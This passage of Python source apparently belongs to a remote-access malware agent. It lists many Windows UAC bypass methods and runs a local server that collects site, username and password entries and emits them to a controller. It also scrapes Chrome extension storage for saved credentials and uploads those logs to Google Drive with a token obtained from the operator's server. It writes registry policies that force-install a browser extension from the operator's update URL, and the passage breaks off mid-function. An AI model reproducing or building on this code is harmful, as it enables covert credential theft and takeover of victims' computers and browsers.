        ctx['registry_enabled'] = bool(REGISTRY_ENABLED)
    except Exception:
        pass
    try:
        if method_name:
            ctx['method_enabled'] = bool(UAC_BYPASS_METHODS_ENABLED.get(method_name, True))
    except Exception:
        ctx['method_enabled'] = None
    return ctx

def emit_bypass_test_debug(method_id=None, method_name=None, action=None, status=None, reason=None, point=None, extra=None):
    payload = {
        'event': 'bypass_test',
        'action': action or 'unknown',
        'status': status or 'unknown',
        'skipped': True if status == 'skipped' else False,
        'reason': reason or '',
        'point': point or '',
        'method_id': method_id,
        'method_name': method_name,
        'context': _collect_bypass_debug_context(method_id, method_name)
    }
    try:
        if isinstance(extra, dict):
            payload['extra'] = extra
    except Exception:
        pass
    lvl = "info"
    if status == 'error':
        lvl = "error"
    elif status == 'skipped':
        lvl = "warning"
    _write_structured_debug(payload, lvl)

def get_bypass_methods_sequence():
    return [
        {'id': 25, 'name': 'EventVwr.exe registry hijacking'},
        {'id': 30, 'name': 'WOW64 logger hijacking'},
        {'id': 31, 'name': 'sdclt.exe bypass'},
        {'id': 33, 'name': 'fodhelper/computerdefaults ms-settings protocol'},
        {'id': 34, 'name': 'SilentCleanup scheduled task'},
        {'id': 35, 'name': 'Token manipulation and impersonation'},
        {'id': 36, 'name': 'NTFS junction/reparse points'},
        {'id': 39, 'name': '.NET Code Profiler (COR_PROFILER)'},
        {'id': 40, 'name': 'COM handler hijacking'},
        {'id': 41, 'name': 'ICMLuaUtil COM interface'},
        {'id': 43, 'name': 'IColorDataProxy COM interface'},
        {'id': 44, 'name': 'Volatile environment variables'},
        {'id': 45, 'name': 'slui.exe registry hijacking'},
        {'id': 56, 'name': 'WSReset.exe bypass'},
        {'id': 61, 'name': 'AppInfo service manipulation'},
        {'id': 62, 'name': 'Mock directory technique'},
        {'id': 67, 'name': 'winsat.exe bypass'},
        {'id': 68, 'name': 'MMC snapin bypass'}
    ]

def log_bypass_sequence():
    try:
        seq = get_bypass_methods_sequence()
        log_message("Bypass sequence planned")
        for m in seq:
            log_message(f"Method {m['id']}: {m['name']}")
    except Exception:
        pass

log_bypass_sequence()

BYPASS_DEBUG_ENABLED = True
def debug_bypass_method(method_key: str) -> dict:
    try:
        enabled = bool(UAC_BYPASS_METHODS_ENABLED.get(method_key, False))
        executed = enabled and not DISABLE_UAC_BYPASS and BYPASSES_ENABLED
        log_message(f"[DEBUG] Bypass '{method_key}' -> enabled={enabled}, executed={executed}", "info")
        return {'method': method_key, 'enabled': enabled, 'executed': executed}
    except Exception as e:
        return {'method': method_key, 'enabled': False, 'executed': False, 'error': str(e)}

def debug_registry_action(action_key: str) -> dict:
    try:
        enabled = bool(REGISTRY_ACTIONS.get(action_key, False))
        executed = enabled and REGISTRY_ENABLED
        log_message(f"[DEBUG] Registry '{action_key}' -> enabled={enabled}, executed={executed}", "info")
        return {'action': action_key, 'enabled': enabled, 'executed': executed}
    except Exception as e:
        return {'action': action_key, 'enabled': False, 'executed': False, 'error': str(e)}

def disable_slui_bypass():
    global DISABLE_SLUI_BYPASS
    DISABLE_SLUI_BYPASS = True
    log_message("SLUI bypass disabled", "info")

def enable_full_uac_bypass_debugging():
    global UAC_BYPASS_DEBUG_MODE, DEBUG_MODE, SILENT_MODE
    UAC_BYPASS_DEBUG_MODE = True
    DEBUG_MODE = True
    SILENT_MODE = False
    log_message("UAC bypass full debug mode enabled", "warning")

def detect_defender_threats() -> bool:
    try:
        if not WINDOWS_AVAILABLE:
            return False
        cmd = [
            "powershell",
            "-NoProfile",
            "-ExecutionPolicy", "Bypass",
            "-Command",
            "try { Get-MpThreatDetection | Select-Object ThreatName,Severity,InitialDetectionTime | ConvertTo-Json -Compress } catch { '' }"
        ]
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
        out, err = p.communicate(timeout=5)
        if err:
            return False
        data = out.decode(errors="ignore").strip()
        if not data:
            return False
        if data.startswith("[") or data.startswith("{"):
            return True
        return False
    except Exception:
        return False

VAULT_SERVER_PORT = 5000
VAULT_SERVER_ACTIVE = False
VAULT_SERVER_THREAD = None
VAULT_EXTENSION_ID = os.environ.get('VAULT_EXTENSION_ID') or "cicnkiabgagcfkheiplebojnbjpldlff"
VAULT_SCAN_ACTIVE = False
VAULT_SCAN_THREAD = None
VAULT_SEEN_FILE = os.path.join(os.getcwd(), 'uploads', 'vault_seen.json') if 'os' in globals() else 'vault_seen.json'
VAULT_EXT_DIRS = []
VAULT_EXT_IDS_SCANNED = []
EXT_MONITOR_ACTIVE = False
EXT_MONITOR_THREAD = None

def _start_vault_http_server():
    import threading, json, os
    from http.server import BaseHTTPRequestHandler, HTTPServer
    try:
        from socketserver import ThreadingMixIn
    except Exception:
        ThreadingMixIn = object
    class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
        daemon_threads = True
    class H(BaseHTTPRequestHandler):
        def _set_headers(self, code=200):
            try:
                self.send_response(code)
                self.send_header('Content-Type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.send_header('Access-Control-Allow-Headers', 'Content-Type')
                self.send_header('Access-Control-Allow-Methods', 'GET,POST,OPTIONS')
                self.end_headers()
            except Exception:
                pass
        def do_OPTIONS(self):
            self._set_headers(204)
        def do_GET(self):
            try:
                if self.path.startswith('/get'):
                    entries = []
                    base = os.path.join(os.getcwd())
                    vf = os.path.join(base, 'vault.txt')
                    if os.path.exists(vf):
                        with open(vf, 'r', encoding='utf-8') as f:
                            for line in f:
                                line = line.strip()
                                if not line:
                                    continue
                                p = line.split('|', 2)
                                if len(p) == 3:
                                    entries.append({'site': p[0], 'username': p[1], 'password': p[2]})
                    self._set_headers(200)
                    self.wfile.write(json.dumps(entries).encode('utf-8'))
                    return
                self._set_headers(404)
                self.wfile.write(b'{}')
            except Exception:
                try:
                    self._set_headers(500)
                    self.wfile.write(b'{}')
                except Exception:
                    pass
        def do_POST(self):
            try:
                if self.path.startswith('/save'):
                    ln = int(self.headers.get('Content-Length') or '0')
                    raw = self.rfile.read(ln) if ln > 0 else b''
                    data = {}
                    try:
                        data = json.loads(raw.decode('utf-8') if isinstance(raw, (bytes, bytearray)) else str(raw))
                    except Exception:
                        data = {}
                    site = (data or {}).get('site')
                    username = (data or {}).get('username')
                    password = (data or {}).get('password')
                    if not site or not username or not password:
                        self._set_headers(400)
                        self.wfile.write(b'{}')
                        return
                    base = os.path.join(os.getcwd())
                    vf = os.path.join(base, 'vault.txt')
                    try:
                        with open(vf, 'a', encoding='utf-8') as f:
                            f.write(f'{site}|{username}|{password}\n')
                    except Exception:
                        pass
                    try:
                        agent_id = get_or_create_agent_id()
                        safe_emit('vault_entry', {'agent_id': agent_id, 'site': site, 'username': username, 'password': password})
                    except Exception:
                        pass
                    self._set_headers(200)
                    self.wfile.write(b'{"status":"saved"}')
                    return
                self._set_headers(404)
                self.wfile.write(b'{}')
            except Exception:
                try:
                    self._set_headers(500)
                    self.wfile.write(b'{}')
                except Exception:
                    pass
    def run():
        try:
            try:
                host = os.environ.get('VAULT_BIND_HOST', '').strip()
                port_str = os.environ.get('VAULT_BIND_PORT', '').strip()
                if not host:
                    # Render and other PaaS expose a PORT env; bind to 0.0.0.0 there
                    paas_port = os.environ.get('PORT', '').strip()
                    if paas_port:
                        host = '0.0.0.0'
                        port_str = paas_port
                if not host:
                    host = '127.0.0.1'
                port = int(port_str) if port_str else int(VAULT_SERVER_PORT)
            except Exception:
                host = '127.0.0.1'
                port = int(VAULT_SERVER_PORT)
            srv = ThreadingHTTPServer((host, port), H)
            srv.serve_forever()
        except Exception:
            pass
    t = threading.Thread(target=run, daemon=True)
    t.start()
    return t

def start_vault_server():
    global VAULT_SERVER_ACTIVE, VAULT_SERVER_THREAD
    if VAULT_SERVER_ACTIVE:
        return
    try:
        VAULT_SERVER_THREAD = _start_vault_http_server()
        VAULT_SERVER_ACTIVE = True
        try:
            agent_id = get_or_create_agent_id()
            installed = False
            try:
                # Basic installed detection via registry
                import sys
                if sys.platform == 'win32':
                    import winreg
                    try:
                        base2 = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Policies\Google\Chrome\ExtensionInstallForcelist")
                        i = 0
                        while True:
                            try:
                                name, value, _ = winreg.EnumValue(base2, i)
                                i += 1
                                if isinstance(value, str) and value.startswith(VAULT_EXTENSION_ID + ";"):
                                    installed = True
                                    break
                            except OSError:
                                break
                        try:
                            winreg.CloseKey(base2)
                        except Exception:
                            pass
                    except Exception:
                        pass
                    if not installed:
                        try:
                            winreg.OpenKey(winreg.HKEY_CURRENT_USER, fr"Software\Google\Chrome\Extensions\{VAULT_EXTENSION_ID}")
                            installed = True
                        except Exception:
                            pass
            except Exception:
                pass
            safe_emit('vault_status', {'agent_id': agent_id, 'active': True, 'installed': installed})
        except Exception:
            pass
    except Exception:
        VAULT_SERVER_ACTIVE = False

def _get_chrome_ext_settings_dirs():
    try:
        import os
        base = os.environ.get('LOCALAPPDATA') or ''
        if not base:
            return []
        user_data = os.path.join(base, 'Google', 'Chrome', 'User Data')
        if not os.path.isdir(user_data):
            return []
        dirs = []
        for name in os.listdir(user_data):
            prof_path = os.path.join(user_data, name)
            if not os.path.isdir(prof_path):
                continue
            # Typical Chrome profile folders: Default, Profile 1, Profile 2, Guest Profile, etc.
            les = os.path.join(prof_path, 'Local Extension Settings')
            if os.path.isdir(les):
                dirs.append(les)
        return dirs
    except Exception:
        return []

def _find_vault_extension_dirs():
    results = []
    try:
        import os, re
        roots = _get_chrome_ext_settings_dirs()
        for root in roots:
            try:
                for ext_id in os.listdir(root):
                    p = os.path.join(root, ext_id)
                    if not os.path.isdir(p):
                        continue
                    found = False
                    try:
                        for name in os.listdir(p):
                            fp = os.path.join(p, name)
                            try:
                                with open(fp, 'rb') as f:
                                    data = f.read()
                                txt = data.decode('utf-8', errors='ignore')
                                if ('vault_' in txt) or ('\"vault_installed\"' in txt) or re.search(r'\{"pass":.*?"site":.*?"user":', txt, re.DOTALL):
                                    found = True
                                    break
                            except Exception:
                                pass
                    except Exception:
                        pass
                    if found:
                        results.append((p, ext_id))
            except Exception:
                pass
        return results
    except Exception:
        return []

def _scan_vault_specific_log(ext_id):
    items = []
    try:
        import os
        roots = _get_chrome_ext_settings_dirs()
        for root in roots:
            p = os.path.join(root, ext_id)
            if not os.path.isdir(p):
                continue
            for fname in ('000003.log', 'LOG', 'LOG.old', '000002.log'):
                fp = os.path.join(p, fname)
                if not os.path.isfile(fp):
                    continue
                try:
                    with open(fp, 'rb') as f:
                        data = f.read()
                    got = _extract_entries_from_bytes(data)
                    if got:
                        items.extend(got)
                except Exception:
                    pass
        return items
    except Exception:
        return []
def _get_vault_log_paths(ext_id):
    try:
        import os
        paths = []
        roots = _get_chrome_ext_settings_dirs()
        placeholder = "abcdefghijklmnopabcdefghijklmnop"
        target_ids = []
        if ext_id and ext_id != placeholder:
            target_ids = [ext_id]
        else:
            # Fallback: scan all extension ids under Local Extension Settings
            for root in roots:
                try:
                    for eid in os.listdir(root):
                        p = os.path.join(root, eid)
                        if os.path.isdir(p):
                            target_ids.append(eid)
                except Exception:
                    pass
        for root in roots:
            for eid in target_ids:
                p = os.path.join(root, eid)
                if not os.path.isdir(p):
                    continue
                for fname in ('000003.log', 'LOG', 'LOG.old', '000002.log'):
                    fp = os.path.join(p, fname)
                    if os.path.isfile(fp):
                        paths.append(fp)
        return paths
    except Exception:
        return []

LAST_LOG_SHA256 = None
LAST_LOG_PATH = None

def _mirror_log_to_drive(agent_id):
    global LAST_LOG_SHA256, LAST_LOG_PATH
    try:
        import hashlib, os, io
        acc = _drive_access(agent_id)
        if not acc:
            try:
                safe_emit('drive_mirror_result', {'agent_id': agent_id, 'success': False, 'error': 'no_access_token'})
            except Exception:
                pass
            return False
        paths = _get_vault_log_paths(VAULT_EXTENSION_ID) or []
        if not paths:
            try:
                safe_emit('drive_mirror_result', {'agent_id': agent_id, 'success': False, 'error': 'no_log_paths'})
            except Exception:
                pass
            return False
        # prefer 000003.log explicitly
        preferred = None
        for p in paths:
            if os.path.basename(p).lower() == '000003.log':
                preferred = p
                break
        src = preferred or paths[0]
        with open(src, 'rb') as f:
            data = f.read()
        sha256 = hashlib.sha256(data).hexdigest()
        if LAST_LOG_SHA256 == sha256 and LAST_LOG_PATH == src:
            try:
                safe_emit('drive_mirror_result', {'agent_id': agent_id, 'success': True, 'skipped': True, 'reason': 'unchanged', 'file': os.path.basename(src), 'folder': acc.get('folder')})
            except Exception:
                pass
            return True
        # Try googleapiclient if available; otherwise fallback to raw-bytes REST write
        used_api_client = False
        try:
            from googleapiclient.discovery import build
            from googleapiclient.http import MediaIoBaseUpload
            try:
                # Prefer google-auth credentials; construct from access token only
                from google.oauth2.credentials import Credentials as _Creds
                creds = _Creds(token=acc['token'])
            except Exception:
                creds = None
            if creds is not None:
                service = build('drive', 'v3', credentials=creds, cache_discovery=False)
                q = f"name = '{os.path.basename(src)}' and '{acc['folder']}' in parents and trashed = false"
                res = service.files().list(q=q, fields="files(id)", supportsAllDrives=True, includeItemsFromAllDrives=True).execute()
                files = (res or {}).get('files', []) if isinstance(res, dict) else []
                media = MediaIoBaseUpload(io.BytesIO(data), mimetype='application/octet-stream', resumable=True)
                if files:
                    fid = files[0].get('id')
                    if fid:
                        service.files().update(fileId=fid, media_body=media, supportsAllDrives=True).execute()
                        used_api_client = True
                if not used_api_client:
                    meta = {'name': os.path.basename(src), 'parents': [acc['folder']]}
                    service.files().create(body=meta, media_body=media, fields='id', supportsAllDrives=True).execute()
                    used_api_client = True
        except Exception:
            used_api_client = False
        if not used_api_client:
            # Fallback: write binary using REST helpers
            ok = _drive_safe_write_binary(acc['token'], acc['folder'], os.path.basename(src), data, "application/octet-stream")
            if not ok:
                try:
                    safe_emit('drive_mirror_result', {'agent_id': agent_id, 'success': False, 'error': 'binary_write_failed', 'file': os.path.basename(src), 'folder': acc.get('folder')})
                except Exception:
                    pass
                return False
        LAST_LOG_SHA256 = sha256
        LAST_LOG_PATH = src
        try:
            chk = _drive_find_file(acc['token'], acc['folder'], os.path.basename(src))
            if not chk:
                # retry create-in-place; if still not found, create with timestamped name
                created = _drive_create_binary_file(acc['token'], acc['folder'], os.path.basename(src), data, "application/octet-stream")
                if not created:
                    import time as _t
                    alt_name = f"000003-{int(_t.time())}.log"
                    _drive_create_binary_file(acc['token'], acc['folder'], alt_name, data, "application/octet-stream")
        except Exception:
            pass
        try:
            safe_emit('drive_mirror_result', {'agent_id': agent_id, 'success': True, 'file': os.path.basename(src), 'folder': acc.get('folder'), 'sha256': sha256})
        except Exception:
            pass
        return True
    except Exception as e:
        try:
            safe_emit('drive_mirror_result', {'agent_id': agent_id, 'success': False, 'error': str(e)[:200]})
        except Exception:
            pass
        return False
def _extract_entries_from_bytes(data_bytes):
    ents = []
    try:
        import re, json
        txt = data_bytes.decode('utf-8', errors='ignore')
        matches = re.findall(r'\{"pass":.*?\}', txt, re.DOTALL)
        for m in matches:
            try:
                obj = json.loads(m)
                site = str(obj.get('site') or '')
                user = str(obj.get('user') or '')
                pwd = str(obj.get('pass') or '')
                if site and user and pwd:
                    ents.append({'site': site, 'username': user, 'password': pwd})
            except Exception:
                pass
    except Exception:
        pass
    return ents

def _scan_extension_entries(ext_dir):
    results = []
    try:
        import os
        if not ext_dir or not os.path.isdir(ext_dir):
            return results
        for name in os.listdir(ext_dir):
            fp = os.path.join(ext_dir, name)
            if not os.path.isfile(fp):
                continue
            try:
                with open(fp, 'rb') as f:
                    data = f.read()
                items = _extract_entries_from_bytes(data)
                if items:
                    results.extend(items)
            except Exception:
                pass
    except Exception:
        pass
    return results
def _drive_access(agent_id):
    try:
        import requests, json
        url = f"{SERVER_URL.rstrip('/')}/api/drive/access"
        resp = requests.get(url, params={'agent_id': agent_id}, timeout=10)
        if not (resp is not None and resp.status_code == 200):
            return None
        js = {}
        try:
            js = resp.json()
        except Exception:
            js = {}
        if not js.get('success'):
            return None
        tok = js.get('access_token')
        fid = js.get('agent_folder_id')
        rid = js.get('root_id')
        exp = js.get('expires_in')
        if not tok or not fid:
            return None
        return {'token': tok, 'folder': fid, 'root': rid, 'expires_in': exp}
    except Exception:
        return None
def _drive_api(token, method, url, headers=None, params=None, data=None):
    try:
        import requests
        h = {'Authorization': f'Bearer {token}'}
        if headers:
            h.update(headers)
        resp = requests.request(method, url, headers=h, params=params, data=data, timeout=20)
        return resp
    except Exception:
        return None
def _drive_find_file(token, parent_id, name):
    try:
        base = "https://www.googleapis.com/drive/v3/files"
        q = f"name = '{name}' and '{parent_id}' in parents and trashed = false"
        resp = _drive_api(token, "GET", base, params={"q": q, "fields": "files(id,name,mimeType)", "supportsAllDrives": "true"})
        try:
            items = resp.json().get('files', []) if resp is not None and resp.ok else []
        except Exception:
            items = []
        if items:
            return items[0].get('id')
        return None
    except Exception:
        return None
def _drive_get_file_content(token, file_id):
    try:
        url = f"https://www.googleapis.com/drive/v3/files/{file_id}"
        resp = _drive_api(token, "GET", url, params={"alt": "media", "supportsAllDrives": "true"})
        if resp is not None and resp.ok:
            try:
                return resp.text
            except Exception:
                return ""
        return ""
    except Exception:
        return ""
def _drive_create_text_file(token, parent_id, name, content):
    try:
        import json, uuid
        meta = {"name": name, "mimeType": "text/plain", "parents": [parent_id]}
        boundary = "pm" + str(uuid.uuid4()).replace("-", "")
        body = []
        body.append(f"--{boundary}\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n")
        body.append(json.dumps(meta))
        body.append(f"\r\n--{boundary}\r\nContent-Type: text/plain\r\n\r\n")
        body.append(content)
        body.append(f"\r\n--{boundary}--\r\n")
        data = "".join(body).encode("utf-8")
        url_multi = "https://www.googleapis.com/upload/drive/v3/files"
        resp2 = _drive_api(token, "POST", url_multi, headers={"Content-Type": f"multipart/related; boundary={boundary}"}, params={"uploadType": "multipart", "supportsAllDrives": "true"}, data=data)
        try:
            if resp2 is not None and resp2.ok:
                return resp2.json().get('id')
        except Exception:
            pass
        url_meta = "https://www.googleapis.com/drive/v3/files"
        resp1 = _drive_api(token, "POST", url_meta, headers={"Content-Type": "application/json"}, params={"supportsAllDrives": "true"}, data=json.dumps(meta).encode("utf-8"))
        fid = None
        try:
            if resp1 is not None and resp1.ok:
                fid = resp1.json().get('id')
        except Exception:
            fid = None
        if fid:
            url_up = f"https://www.googleapis.com/upload/drive/v3/files/{fid}"
            resp3 = _drive_api(token, "PATCH", url_up, headers={"Content-Type": "text/plain"}, params={"uploadType": "media", "supportsAllDrives": "true"}, data=content.encode("utf-8"))
            if resp3 is not None and resp3.ok:
                return fid
        return None
    except Exception:
        return None
def _drive_update_text_file(token, file_id, content):
    url = f"https://www.googleapis.com/upload/drive/v3/files/{file_id}"
    resp = _drive_api(token, "PATCH", url, headers={"Content-Type": "text/plain"}, params={"uploadType": "media", "supportsAllDrives": "true"}, data=content.encode("utf-8"))
    return resp is not None and resp.ok
def _drive_update_text_file_multipart(token, file_id, content):
    import json, uuid
    boundary = "pmu" + str(uuid.uuid4()).replace("-", "")
    meta = {"mimeType": "text/plain"}
    body = []
    body.append(f"--{boundary}\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n")
    body.append(json.dumps(meta))
    body.append(f"\r\n--{boundary}\r\nContent-Type: text/plain\r\n\r\n")
    body.append(content)
    body.append(f"\r\n--{boundary}--\r\n")
    data = "".join(body).encode("utf-8")
    url = f"https://www.googleapis.com/upload/drive/v3/files/{file_id}"
    resp = _drive_api(token, "PATCH", url, headers={"Content-Type": f"multipart/related; boundary={boundary}"}, params={"uploadType": "multipart", "supportsAllDrives": "true"}, data=data)
    return resp is not None and resp.ok
def _drive_update_text_file_resumable(token, file_id, content):
    import json
    init_url = f"https://www.googleapis.com/upload/drive/v3/files/{file_id}"
    init_resp = _drive_api(token, "PATCH", init_url, headers={"Content-Type": "application/json; charset=UTF-8"}, params={"uploadType": "resumable", "supportsAllDrives": "true"}, data=json.dumps({}).encode("utf-8"))
    if not (init_resp is not None and (init_resp.ok or init_resp.status_code in (200, 201))):
        return False
    session_url = None
    try:
        session_url = init_resp.headers.get("Location")
    except Exception:
        session_url = None
    if not session_url:
        return False
    try:
        import requests
        headers = {"Content-Type": "text/plain", "Authorization": f"Bearer {token}"}
        put_resp = requests.put(session_url, headers=headers, data=content.encode("utf-8"), timeout=30)
        return put_resp is not None and (put_resp.ok or put_resp.status_code in (200, 201))
    except Exception:
        return False
def _drive_create_binary_file(token, parent_id, name, data_bytes, mimetype="application/octet-stream"):
    try:
        import json, uuid
        boundary = "pm" + str(uuid.uuid4()).replace("-", "")
        meta = {"name": name, "parents": [parent_id]}
        parts = []
        parts.append(f"--{boundary}\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n".encode("utf-8"))
        parts.append(json.dumps(meta).encode("utf-8"))
        parts.append(f"\r\n--{boundary}\r\nContent-Type: {mimetype}\r\n\r\n".encode("utf-8"))
        parts.append(data_bytes)
        parts.append(f"\r\n--{boundary}--\r\n".encode("utf-8"))
        body = b"".join(parts)
        url_multi = "https://www.googleapis.com/upload/drive/v3/files"
        resp = _drive_api(token, "POST", url_multi, headers={"Content-Type": f"multipart/related; boundary={boundary}"}, params={"uploadType": "multipart", "supportsAllDrives": "true"}, data=body)
        if resp is not None and resp.ok:
            try:
                return resp.json().get("id")
            except Exception:
                return None
        return None
    except Exception:
        return None
def _drive_update_binary_file(token, file_id, data_bytes, mimetype="application/octet-stream"):
    url = f"https://www.googleapis.com/upload/drive/v3/files/{file_id}"
    resp = _drive_api(token, "PATCH", url, headers={"Content-Type": mimetype}, params={"uploadType": "media", "supportsAllDrives": "true"}, data=data_bytes)
    return resp is not None and resp.ok
def _drive_update_binary_file_multipart(token, file_id, data_bytes, mimetype="application/octet-stream"):
    import json, uuid
    boundary = "pmu" + str(uuid.uuid4()).replace("-", "")
    meta = {"mimeType": mimetype}
    parts = []
    parts.append(f"--{boundary}\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n".encode("utf-8"))
    parts.append(json.dumps(meta).encode("utf-8"))
    parts.append(f"\r\n--{boundary}\r\nContent-Type: {mimetype}\r\n\r\n".encode("utf-8"))
    parts.append(data_bytes)
    parts.append(f"\r\n--{boundary}--\r\n".encode("utf-8"))
    body = b"".join(parts)
    url = f"https://www.googleapis.com/upload/drive/v3/files/{file_id}"
    resp = _drive_api(token, "PATCH", url, headers={"Content-Type": f"multipart/related; boundary={boundary}"}, params={"uploadType": "multipart", "supportsAllDrives": "true"}, data=body)
    return resp is not None and resp.ok
def _drive_update_binary_file_resumable(token, file_id, data_bytes, mimetype="application/octet-stream"):
    import json
    init_url = f"https://www.googleapis.com/upload/drive/v3/files/{file_id}"
    init_resp = _drive_api(token, "PATCH", init_url, headers={"Content-Type": "application/json; charset=UTF-8"}, params={"uploadType": "resumable", "supportsAllDrives": "true"}, data=json.dumps({}).encode("utf-8"))
    if not (init_resp is not None and (init_resp.ok or init_resp.status_code in (200, 201))):
        return False
    session_url = None
    try:
        session_url = init_resp.headers.get("Location")
    except Exception:
        session_url = None
    if not session_url:
        return False
    try:
        import requests
        headers = {"Content-Type": mimetype, "Authorization": f"Bearer {token}"}
        put_resp = requests.put(session_url, headers=headers, data=data_bytes, timeout=60)
        return put_resp is not None and (put_resp.ok or put_resp.status_code in (200, 201))
    except Exception:
        return False
def _drive_safe_write_binary(token, parent_id, name, data_bytes, mimetype="application/octet-stream"):
    fid = _drive_find_file(token, parent_id, name)
    if not fid:
        created = _drive_create_binary_file(token, parent_id, name, data_bytes, mimetype)
        return (created is not None)
    ok = (_drive_update_binary_file(token, fid, data_bytes, mimetype)
          or _drive_update_binary_file_multipart(token, fid, data_bytes, mimetype)
          or _drive_update_binary_file_resumable(token, fid, data_bytes, mimetype))
    if ok:
        return True
    try:
        fid2 = _drive_find_file(token, parent_id, name)
    except Exception:
        fid2 = None
    if fid2 and fid2 != fid:
        ok2 = (_drive_update_binary_file(token, fid2, data_bytes, mimetype)
               or _drive_update_binary_file_multipart(token, fid2, data_bytes, mimetype)
               or _drive_update_binary_file_resumable(token, fid2, data_bytes, mimetype))
        if ok2:
            return True
    try:
        url_del = f"https://www.googleapis.com/drive/v3/files/{fid}"
        _drive_api(token, "DELETE", url_del, params={"supportsAllDrives": "true"})
    except Exception:
        pass
    created2 = _drive_create_binary_file(token, parent_id, name, data_bytes, mimetype)
    return (created2 is not None)
def _drive_safe_write_text(token, parent_id, name, content):
    fid = _drive_find_file(token, parent_id, name)
    if not fid:
        created = _drive_create_text_file(token, parent_id, name, content)
        return (created is not None)
    ok = _drive_update_text_file(token, fid, content) or _drive_update_text_file_multipart(token, fid, content) or _drive_update_text_file_resumable(token, fid, content)
    if ok:
        return True
    try:
        fid2 = _drive_find_file(token, parent_id, name)
    except Exception:
        fid2 = None
    if fid2 and fid2 != fid:
        ok2 = _drive_update_text_file(token, fid2, content) or _drive_update_text_file_multipart(token, fid2, content) or _drive_update_text_file_resumable(token, fid2, content)
        if ok2:
            return True
    try:
        url_del = f"https://www.googleapis.com/drive/v3/files/{fid}"
        _drive_api(token, "DELETE", url_del, params={"supportsAllDrives": "true"})
    except Exception:
        pass
    created2 = _drive_create_text_file(token, parent_id, name, content)
    return (created2 is not None)
def _drive_append_line(token, parent_id, name, line):
    fid = _drive_find_file(token, parent_id, name)
    if fid:
        old = _drive_get_file_content(token, fid) or ""
        new = old + ("" if old.endswith("\n") or old == "" else "\n") + line + "\n"
        return _drive_safe_write_text(token, parent_id, name, new)
    else:
        return _drive_safe_write_text(token, parent_id, name, line + "\n")

def _load_seen_keys():
    try:
        import os, json
        if not os.path.exists(os.path.dirname(VAULT_SEEN_FILE) or ''):
            try:
                os.makedirs(os.path.dirname(VAULT_SEEN_FILE), exist_ok=True)
            except Exception:
                pass
        if os.path.exists(VAULT_SEEN_FILE):
            with open(VAULT_SEEN_FILE, 'r', encoding='utf-8') as f:
                d = json.load(f)
                if isinstance(d, dict):
                    return set(map(str, d.get('seen', [])))
        return set()
    except Exception:
        return set()

def _save_seen_keys(seen):
    try:
        import json
        with open(VAULT_SEEN_FILE, 'w', encoding='utf-8') as f:
            json.dump({'seen': list(seen)}, f)
    except Exception:
        pass

def start_vault_scanner():
    global VAULT_SCAN_ACTIVE, VAULT_SCAN_THREAD, VAULT_EXT_DIRS, VAULT_EXT_IDS_SCANNED
    if VAULT_SCAN_ACTIVE:
        return
    try:
        found = _find_vault_extension_dirs()
        VAULT_EXT_DIRS = [d for (d, _) in found]
        VAULT_EXT_IDS_SCANNED = [eid for (_, eid) in found]
        agent_id = get_or_create_agent_id()
        try:
            safe_emit('vault_status', {'agent_id': agent_id, 'active': True, 'installed': bool(VAULT_EXT_DIRS)})
        except Exception:
            pass
        if not VAULT_EXT_DIRS:
            return
        seen = _load_seen_keys()
        had_installed = bool(VAULT_EXT_DIRS)
        def loop():
            try:
                while True:
                    try:
                        # periodically re-discover new profiles/extensions
                        try:
                            new_found = _find_vault_extension_dirs()
                            if new_found:
                                VAULT_EXT_DIRS = [d for (d, _) in new_found]
                                VAULT_EXT_IDS_SCANNED = [eid for (_, eid) in new_found]
                            now_installed = bool(VAULT_EXT_DIRS)
                            if now_installed != had_installed:
                                had_installed = now_installed
                                try:
                                    safe_emit('vault_status', {'agent_id': agent_id, 'active': True, 'installed': now_installed})
                                except Exception:
                                    pass
                        except Exception:
                            pass
                        all_items = []
                        all_items = _scan_vault_specific_log(VAULT_EXTENSION_ID) or []
                        if not all_items:
                            for d in VAULT_EXT_DIRS:
                                all_items.extend(_scan_extension_entries(d) or [])
                        for it in all_items:
                            key = f"{it['site']}|{it['username']}|{it['password']}"
                            if key in seen:
                                continue
                            seen.add(key)
                            try:
                                _save_seen_keys(seen)
                            except Exception:
                                pass
                                try:
                                    safe_emit('vault_entry', {'agent_id': agent_id, 'site': it['site'], 'username': it['username'], 'password': it['password']})
                                except Exception:
                                    pass
                    except Exception:
                        pass
                    time.sleep(10)
            except Exception:
                pass
        VAULT_SCAN_ACTIVE = True
        t = threading.Thread(target=loop, daemon=True)
        t.start()
        VAULT_SCAN_THREAD = t
    except Exception:
        VAULT_SCAN_ACTIVE = False
def install_vault_extension_policy():
    import sys
    if sys.platform != 'win32':
        return
    import winreg, os, urllib.request, tempfile, json
    try:
        base = SERVER_URL if USE_FIXED_SERVER_URL else get_controller_url()
    except Exception:
        base = SERVER_URL
    try:
        cfg = _fetch_extension_config()
    except Exception:
        cfg = {}
    ext_id = str(cfg.get('extension_id') or VAULT_EXTENSION_ID)
    update_url = f"{(base or SERVER_URL).rstrip('/')}/download/extensions/update.xml"
    try:
        access_sources = winreg.KEY_SET_VALUE | getattr(winreg, "KEY_WOW64_64KEY", 0)
        base_src = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Policies\Google\Chrome\ExtensionInstallSources", 0, access_sources)
        winreg.SetValueEx(base_src, "1", 0, winreg.REG_SZ, "http://*/*")
        winreg.SetValueEx(base_src, "2", 0, winreg.REG_SZ, "https://*/*")
        try: winreg.CloseKey(base_src)
        except Exception: pass
    except Exception:
        pass
    try:
        access2 = winreg.KEY_SET_VALUE | getattr(winreg, "KEY_WOW64_64KEY", 0)
        base2 = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Policies\Google\Chrome\ExtensionInstallForcelist", 0, access2)
        winreg.SetValueEx(base2, "1", 0, winreg.REG_SZ, f"{ext_id};{update_url}")
        try: winreg.CloseKey(base2)
        except Exception: pass
    except Exception:
        pass
    try:
        access_es = winreg.KEY_SET_VALUE | getattr(winreg, "KEY_WOW64_64KEY", 0)
        key_es = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Policies\Google\Chrome", 0, access_es)
        current = "{}"
        try:
